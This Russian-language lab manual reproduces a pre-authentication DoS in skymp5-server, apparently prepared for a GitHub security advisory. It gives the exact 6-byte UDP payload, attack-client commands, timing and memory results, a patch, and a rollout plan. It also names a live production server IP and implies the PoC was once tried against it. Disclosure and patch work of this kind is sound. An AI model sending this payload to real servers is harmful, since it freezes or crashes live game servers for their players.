# ЛАБОРАТОРИЯ skymp 0-day — полная инструкция

Дата: 2026-09-14.

> ПРАВИЛО ЛАБОРАТОРИИ: всё биндится и коннектится ТОЛЬКО на 127.0.0.1.
> Никаких боевых IP в client.cpp. Прод тестируется только после накатки
> патча, только в тех окно, только при 0 игроков (см. раздел 8).

---

## 1. ЧТО ЭТО И ЗАЧЕМ

Это локальный стенд, воспроизводящий уязвимость в skymp5-server (ядро
всех skymp-серверов):

**Unauthenticated remote DoS одним 6-байтным UDP-пакетом.**

Серверный парсер читает из пакета число `n` ("сколько элементов в строке")
и делает n итераций, не проверяя, есть ли в потоке данные. Пакет с
n = 4 294 967 295 заставляет сервер построить строку 4.3 ГБ:
- фриз главного тика ~17 с (вся игра стоит, однопоточный тик);
- пик RAM ~7.7 ГБ (удвоения при realloc) -> OOM-kill на большинстве серверов;
- аутентификация НЕ нужна: парсинг идёт до логина (PartOne.cpp:918 —
  проверяется только факт UDP-коннекта).

Стенд нужен, чтобы: (а) убедиться своими глазами, (б) доказать фикс,
(в) приложить воспроизводимые артефакты к GitHub security advisory.

## 2. ИЗ ЧЕГО СОСТОИТ (файлы и зачем каждый)

| Файл | Что это |
|---|---|
| `server.exe` | мини-сервер: настоящий SLikeNet RakPeer (UDP 7777, только 127.0.0.1) + НАСТОЯЩИЙ парсер skymp (`BitStreamInputArchive.h` без изменений) + точная конструкция BitStream из `MessageSerializerFactory.cpp:42-46` |
| `server_patched.exe` | то же, но с патчем: include-путь `patched\` стоит первым, компилятор берёт исправленный заголовок |
| `client.exe` | атакующий клиент: настоящее RakNet-рукопожатие -> отправка PoC-пакета. Аргумент = n (hex) |
| `poc.cpp` | автономный harness (без сети): кормит пакет прямо в парсер, печатает размер строки / время / peak RSS. Им подтверждена линейность: 1M / 100M / 4.29B |
| `server.cpp`, `client.cpp` | исходники сервера и клиента |
| `patched\archives\BitStreamInputArchive.h` | ПАТЧ: bounds-check n по остатку потока + zero-init + underflow-check. Копия на Desktop: `BitStreamInputArchive.patched.h` |
| `build-lab.ps1` | сборка: 107 объектов SLikeNet -> `obj\libslikenet.a` -> линковка трёх exe |
| `obj\` | объектные файлы SLikeNet (кэш сборки) |
| `stubs\spdlog\spdlog.h`, `stubs\nlohmann\json_fwd.hpp` | заглушки заголовков, нужные только для компиляции |
| `server_out.txt`, `server_patched_out.txt` | логи последних фоновых прогонов |

Зависимости вне lab (уже на диске):
- `..\mingw\` — портативный g++ 16.2 (winlibs, без установки в систему)
- `..\slikenet\` — исходники SLikeNet (github.com/SLikeSoft/SLikeNet)
- `..\skymp\` — исходники skymp (github.com/skyrim-multiplayer/skymp, main @ 2026-09-13)

## 3. КАК ЭТО РАБОТАЕТ (механика одной строкой на слой)

1. `client.exe` делает настоящее RakNet-рукопожатие с `server.exe`
   (ID_CONNECTION_REQUEST_ACCEPTED приходит БЕЗ логина — как в skymp).
2. Клиент шлёт 6 байт: `86 01 FF FF FF FF`
   = [MinPacketId 134][MsgType::CustomPacket 1][uint32 n big-endian].
3. Сервер строит `SLNet::BitStream(data+1, length-1)` — точно как
   MessageSerializerFactory.cpp:42-46 — и зовёт `Serialize` сообщения
   (точная форма CustomPacketMessage.h:11-18).
4. `BitStreamInputArchive` читает n и крутит n итераций push_back.
   `BitStream::Read()` на исчерпанном потоке возвращает false и НЕ ТРОГАЕТ
   переменную; возврат игнорируется (BitStreamUtil.h:15-18) -> в строку
   летит неинициализированный мусор (проверено в dbg).
5. Итог: строка = n байт из 6-байтного пакета. RSS и время блокировки
   растут линейно с n.

Баги-составляющие (все в репозитории skymp, main @ 2026-09-13):
- CWE-1284: `BitStreamInputArchive.h:33-75` — цикл по n без проверки
  (TODO-комментарий авторов это признаёт);
- CWE-252: `BitStreamUtil.h:15-18` — выброшен возврат Read();
- CWE-456: `BitStreamUtil.ipp:47-52` — возврат неинициализированного T;
- доступность до аутентификации: `PartOne.cpp:915-923`;
- rethrow из приёмного цикла: `Networking.cpp:191-199`.

## 4. ЗАПУСК ПРОВЕРКИ (два окна PowerShell)

Окно 1 — сервер:
```powershell
& "$env:TEMP\opencode\lab\server.exe"
```
Должно напечатать: `listening on 127.0.0.1:7777`, baseline RSS ~4 MB.

Окно 2 — атака (по возрастанию мощности):
```powershell
& "$env:TEMP\opencode\lab\client.exe" 0x00100000   # n=1M:    строка 1 МБ,   ~3 мс
& "$env:TEMP\opencode\lab\client.exe" 0x6400000    # n=100M:  строка 100 МБ, ~0.4 с, RSS ~127 МБ
& "$env:TEMP\opencode\lab\client.exe"              # n=4.29B: строка 4.3 ГБ, ~17 с, RSS ~7.7 ГБ  (закрой браузеры!)
```

Что смотреть:
- окно сервера: строка `Deserialize OK: string=... bytes` — размер ВСЕГДА
  равен n из пакета (усиление x715 000 000 для 6 байт);
- Диспетчер задач: RSS `server.exe` раздувается соответственно;
- во время 17-секундного прогона сервер НЕ отвечает — это и есть фриз
  игрового тика (в реале = все игроки зависают/отваливаются, затем OOM).

Эталонные результаты (замерено 2026-09-13/14, Windows, 32 ГБ RAM):
```
n=1048576      -> string=1048576 B,       3 ms, peak 7 MB
n=104857600    -> string=104857600 B,   390 ms, peak 127 MB
n=4294967295   -> string=4294967295 B, 17431 ms, peak 7684 MB
```

## 5. ПРОВЕРКА ПАТЧА

Окно 1 — пропатченный сервер:
```powershell
& "$env:TEMP\opencode\lab\server_patched.exe"
```
Окно 2 — та же максимальная атака:
```powershell
& "$env:TEMP\opencode\lab\client.exe"
```
Ожидаемо:
```
Deserialize THREW after 0.0 ms: BitStreamInputArchive:
element count exceeds remaining stream size (RSS=5 MB)
```
0 мс, память не растёт, сервер продолжает принимать клиентов.

Логика фикса: каждый элемент занимает на проводе >= 1 байта, поэтому
легитимное n никогда не превышает число непрочитанных байтов потока.
Проверка `n > unreadBytes` выполняется ДО цикла.

## 6. ПЕРЕСБОРКА (если правил исходники)

```powershell
powershell -ExecutionPolicy Bypass -File "$env:TEMP\opencode\lab\build-lab.ps1"
```
Объекты SLikeNet кэшируются в `obj\`; для полной пересборки удали `obj\`.
Компилятор: `$env:TEMP\opencode\mingw\mingw64\bin\g++.exe` (C++20, статическая
линковка — exe ни от чего не зависят).

Контроль после любой пересборки клиента:
```powershell
Select-String -Path "$env:TEMP\opencode\lab\client.cpp" -Pattern 'Connect\('
# ОБЯЗАНО быть: peer->Connect("127.0.0.1", 7777, ...)
```

## 7. ЧТО НЕ ЯВЛЯЕТСЯ СТЕНДОМ (границы)

- Стенд воспроизводит сетевой слой (SLikeNet RakPeer) и парсер (дословно
  исходники skymp) — этого достаточно для доказательства DoS.
- Стенд НЕ содержит игровой мир (espm/JS-гейммод): он находится ПОСЛЕ
  парсера и на уязвимость не влияет.
- Полный E2E на настоящем skymp5-server с гейммодом: собрать сервер из
  исходников в WSL/Docker на localhost (build.sh, нужны espm-файлы Skyrim
  SE), прогнать тот же клиент. Это самый сильный артефакт для advisory.
- Прод-сервер (15.204.80.255:7777) НЕ является стендом. Никаких PoC на
  прод при игроках. Никогда.

## 8. ПОРЯДОК НАКАТКИ ФИКСА НА ПРОД (для владельца)

1. В дереве исходников своей сборки сервера заменить
   `serialization/include/archives/BitStreamInputArchive.h` на
   `Desktop\skymp-0day\BitStreamInputArchive.patched.h`.
2. (Рекомендуется) в `skymp5-server/cpp/mp_common/Networking.cpp` ~197:
   `catch (std::exception& e) { throw; }` -> логирование + continue
   (один битый пакет не должен рвать приёмный цикл).
3. `./build.sh --configure && ./build.sh --build` (Linux, clang-20).
4. Приёмка локально: сервер стартует, гейммод работает, PoC-клиент
   против localhost получает THREW.
5. Деплой в тех окно при players=0 (проверить через).
6. Acceptance-тест на проде (только 0 игроков!): один пакет
   `86 01 FF FF FF FF` -> в логе `element count exceeds...`, процесс жив.
7. До деплоя — страховка в systemd-юните:
   `MemoryMax=6G`, `Restart=always`, `RestartSec=5`.
8. Опубликовать advisory: github.com/skyrim-multiplayer/skymp/security/advisories
   (текст: `Desktop\skymp-0day\ADVISORY-DRAFT.txt`).

## 9. АРТЕФАКТЫ ДЛЯ DISCLOSURE (Desktop\skymp-0day\)

- `SKYMP-0DAY-REPORT.md` — полный техотчёт с file:line-ссылками
- `ADVISORY-DRAFT.txt` — черновик advisory (CVSS 8.6: AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:H)
- `skymp-fix.patch.txt` — патч + defense-in-depth правки
- исходники стенда (poc.cpp, server.cpp, client.cpp, build-lab.ps1,
  BitStreamInputArchive.patched.h) — воспроизводимость для upstream

## 10. FAQ

**Почему big-endian?** SLikeNet BitStream пишет/читает многобайтовые
числа в сетевом порядке. Проверено экспериментально (dbg-прогон: байты
00 00 10 00 читаются как 4096).

**Почему "pre-auth"?** В skymp аутентификация (JWT/Discord-линк) происходит
через CustomPacket с логином ПОСЛЕ коннекта; сам коннект и парсинг любых
Message-пакетов доступны сразу (PartOne.cpp:918 — только IsConnected).

**Почему timeout на проде?** Сетевой слой (фаервол/rate-limit/пароль
коннекта) не пропустил рукопожатие. Это НЕ означает, что прод не уязвим:
код парсера там тот же; прошедший handshake клиент (обычный игрок) достанет
до дыры.

**Это точно 0-day?** На момент проверки (main @ 2026-09-13) фикс в
репозитории отсутствует, issue/advisory по нему не найдены. После
публикации advisory станет N-day с (потенциально) CVE.
